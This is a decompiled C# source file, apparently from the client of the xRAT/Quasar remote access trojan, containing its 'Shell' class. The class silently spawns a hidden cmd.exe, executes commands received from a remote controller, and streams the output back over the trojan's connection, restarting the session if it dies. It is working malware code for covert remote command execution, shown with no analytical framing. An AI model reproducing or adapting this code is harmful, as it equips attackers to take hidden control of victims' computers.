using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Text;
using System.Threading;
using xClient.Core.Packets.ClientPackets;

namespace xClient.Core.Utilities
{
	// Token: 0x020000A5 RID: 165
	public class Shell : IDisposable
	{
		// Token: 0x06000449 RID: 1097 RVA: 0x0000FB2C File Offset: 0x0000DD2C
		private void CreateSession()
		{
			lock (this._readLock)
			{
				this._read = true;
			}
			CultureInfo installedUICulture = CultureInfo.InstalledUICulture;
			this._prc = new Process
			{
				StartInfo = new ProcessStartInfo("cmd")
				{
					UseShellExecute = false,
					RedirectStandardInput = true,
					RedirectStandardOutput = true,
					RedirectStandardError = true,
					StandardOutputEncoding = Encoding.GetEncoding(installedUICulture.TextInfo.OEMCodePage),
					StandardErrorEncoding = Encoding.GetEncoding(installedUICulture.TextInfo.OEMCodePage),
					CreateNoWindow = true,
					WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)),
					Arguments = "/K"
				}
			};
			this._prc.Start();
			this.RedirectOutputs();
			new DoShellExecuteResponse(Environment.NewLine + ">> New Session created" + Environment.NewLine, false).Execute(Class10.client_0);
		}

		// Token: 0x0600044A RID: 1098 RVA: 0x000042EE File Offset: 0x000024EE
		private void RedirectOutputs()
		{
			ThreadPool.QueueUserWorkItem(delegate(object param0)
			{
				this.RedirectStandardOutput();
			});
			ThreadPool.QueueUserWorkItem(delegate(object param0)
			{
				this.RedirectStandardError();
			});
		}

		// Token: 0x0600044B RID: 1099 RVA: 0x0000FC38 File Offset: 0x0000DE38
		private void ReadStream(int firstCharRead, StreamReader streamReader, bool isError)
		{
			lock (this._readStreamLock)
			{
				StringBuilder stringBuilder = new StringBuilder();
				stringBuilder.Append((char)firstCharRead);
				while (streamReader.Peek() > -1)
				{
					int num = streamReader.Read();
					stringBuilder.Append((char)num);
					if (num == 10)
					{
						this.SendAndFlushBuffer(ref stringBuilder, isError);
					}
				}
				this.SendAndFlushBuffer(ref stringBuilder, isError);
			}
		}

		// Token: 0x0600044C RID: 1100 RVA: 0x0000FCB4 File Offset: 0x0000DEB4
		private void SendAndFlushBuffer(ref StringBuilder textbuffer, bool isError)
		{
			if (textbuffer.Length == 0)
			{
				return;
			}
			string text = textbuffer.ToString();
			if (string.IsNullOrEmpty(text))
			{
				return;
			}
			if (isError)
			{
				new DoShellExecuteResponse(text, true).Execute(Class10.client_0);
			}
			else
			{
				new DoShellExecuteResponse(text, false).Execute(Class10.client_0);
			}
			textbuffer.Length = 0;
		}

		// Token: 0x0600044D RID: 1101 RVA: 0x0000FD0C File Offset: 0x0000DF0C
		private void RedirectStandardOutput()
		{
			try
			{
				int firstCharRead;
				while (this._prc != null && !this._prc.HasExited && (firstCharRead = this._prc.StandardOutput.Read()) > -1)
				{
					this.ReadStream(firstCharRead, this._prc.StandardOutput, false);
				}
				lock (this._readLock)
				{
					if (this._read)
					{
						this._read = false;
						throw new ApplicationException("session unexpectedly closed");
					}
				}
			}
			catch (ObjectDisposedException)
			{
			}
			catch (Exception ex)
			{
				if (ex is ApplicationException || ex is InvalidOperationException)
				{
					new DoShellExecuteResponse(string.Format("{0}>> Session unexpectedly closed{0}", Environment.NewLine), true).Execute(Class10.client_0);
					this.CreateSession();
				}
			}
		}

		// Token: 0x0600044E RID: 1102 RVA: 0x0000FDF8 File Offset: 0x0000DFF8
		private void RedirectStandardError()
		{
			try
			{
				int firstCharRead;
				while (this._prc != null && !this._prc.HasExited && (firstCharRead = this._prc.StandardError.Read()) > -1)
				{
					this.ReadStream(firstCharRead, this._prc.StandardError, true);
				}
				lock (this._readLock)
				{
					if (this._read)
					{
						this._read = false;
						throw new ApplicationException("session unexpectedly closed");
					}
				}
			}
			catch (ObjectDisposedException)
			{
			}
			catch (Exception ex)
			{
				if (ex is ApplicationException || ex is InvalidOperationException)
				{
					new DoShellExecuteResponse(string.Format("{0}>> Session unexpectedly closed{0}", Environment.NewLine), true).Execute(Class10.client_0);
					this.CreateSession();
				}
			}
		}

		// Token: 0x0600044F RID: 1103 RVA: 0x0000FEE4 File Offset: 0x0000E0E4
		public bool ExecuteCommand(string command)
		{
			if (this._prc == null || this._prc.HasExited)
			{
				this.CreateSession();
			}
			if (this._prc == null)
			{
				return false;
			}
			this._prc.StandardInput.WriteLine(command);
			this._prc.StandardInput.Flush();
			return true;
		}

		// Token: 0x06000450 RID: 1104 RVA: 0x00004314 File Offset: 0x00002514
		public Shell()
		{
			this.CreateSession();
		}

		// Token: 0x06000451 RID: 1105 RVA: 0x00004338 File Offset: 0x00002538
		public void Dispose()
		{
			this.Dispose(true);
			GC.SuppressFinalize(this);
		}

		// Token: 0x06000452 RID: 1106 RVA: 0x0000FF38 File Offset: 0x0000E138
		protected virtual void Dispose(bool disposing)
		{
			if (disposing)
			{
				lock (this._readLock)
				{
					this._read = false;
				}
				if (this._prc == null)
				{
					return;
				}
				if (!this._prc.HasExited)
				{
					try
					{
						this._prc.Kill();
					}
					catch
					{
					}
				}
				this._prc.Dispose();
				this._prc = null;
			}
		}

		// Token: 0x040001CE RID: 462
		private Process _prc;

		// Token: 0x040001CF RID: 463
		private bool _read;

		// Token: 0x040001D0 RID: 464
		private readonly object _readLock = new object();

		// Token: 0x040001D1 RID: 465
		private readonly object _readStreamLock = new object();
	}
}
